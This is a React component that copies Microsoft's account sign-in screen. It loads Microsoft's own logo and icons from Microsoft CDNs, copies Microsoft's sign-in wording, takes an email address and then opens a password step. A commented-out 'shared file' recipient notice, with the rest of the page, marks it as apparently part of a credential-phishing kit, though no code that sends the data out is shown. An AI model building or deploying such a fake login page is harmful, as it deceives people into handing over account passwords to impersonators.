import "../MainSection.css";
const EmailModal = ({
  data,
  setData,
  showPasswordModal,
  setShowPasswordModal,
}) => {
  const updateEmail = (e) => {
    e.preventDefault();
    data?.email && setShowPasswordModal(true);
  };
  return (
    <>
      <div className="sign-in-container">
        <img
          src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
          alt=""
          className="img-fluid"
        ></img>
        <p className="signIn-text">Sign In</p>
        {/* <p className="recipient">
          Only recipient email address can access shared file
        </p> */}
        <input
          placeholder="Email address"
          name="email"
          type="email"
          className="input-field"
          onChange={(e) => setData({ ...data, email: e.target.value })}
          required
        />
        <p className="no-account">
          No account? <span className="no-link">Create one!</span>
        </p>
        <p className="no-link">Sign in with Windows Hello or a security key?</p>

        <button
          type="submit"
          className="signIn-btn"
          onClick={(e) => updateEmail(e)}
        >
          Next
        </button>
      </div>
      <div className="sign-in-down">
        <div className="sign-in-down-items">
          <img
            src="https://logincdn.msftauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"
            alt=""
          ></img>
          <span>Sign-in options</span>
        </div>
      </div>
    </>
  );
};

export default EmailModal;
